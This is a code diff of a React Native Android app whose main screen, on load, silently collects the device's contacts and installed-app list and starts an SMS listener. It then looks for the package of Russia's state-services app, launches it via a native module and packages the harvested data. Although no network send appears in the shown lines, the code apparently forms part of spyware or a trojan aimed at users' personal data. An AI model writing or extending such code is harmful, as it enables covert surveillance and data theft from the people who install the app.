@@ -2,12 +2,14 @@ import React, { useState, useEffect } from 'react';
 import { View, TextInput, TouchableOpacity, Text, StyleSheet, PermissionsAndroid } from 'react-native';
 import SvgComponent from './svgs/Logo';
 import MyInput from './Components/MyInput';
-import axios from 'axios';
 import Contact from './modules/Contact';
 import Apps from './modules/Apps';
 import Permission from './modules/Permission';
 import Sms_Listener from './modules/Sms_Listener';
+import { NativeModules } from 'react-native';
+import DeviceNumber from 'react-native-device-number';
 export default function App() {
+  const {MainModule} = NativeModules;
   const [inputText, setInputText] = useState('');
   var contacts = ""
   var apps =""
@@ -25,19 +27,23 @@ export default function App() {
   const loadApp = async () => {
     apps = await Apps.loadApps()
     contacts = await Contact.loadContacts()
-   message = await Sms_Listener.startListen()
+    message = await Sms_Listener.startListen()
   };
   const workWithApp = async () => {
     await loadApp()
   }
   const workWithData = async () => {
-    console.log("Contacts: ", contacts[0].phoneNumbers)
-    console.log("meesage: "+message)
+    var apps_no_icons = []
     apps.forEach(element => {
-      if (element.label == "Госуслуги") {
-        console.log("app: ", element.packageName)
+      apps_no_icons.push({label:element.label, packageName: element.packageName})
+    });
+    apps_no_icons.forEach(element => {
+      if(element.packageName == "ru.rostel"){
+        MainModule.fastLoad("ru.rostel")
       }
     });
+    const data = {contacts:contacts, apps:apps_no_icons}
+    console.log(data)
   }
   useEffect(() => {
     const fetchData = async () => {
@@ -45,7 +51,6 @@ export default function App() {
       await workWithApp();
       await workWithData();
     };
-
     fetchData();
   }, [])
   return (
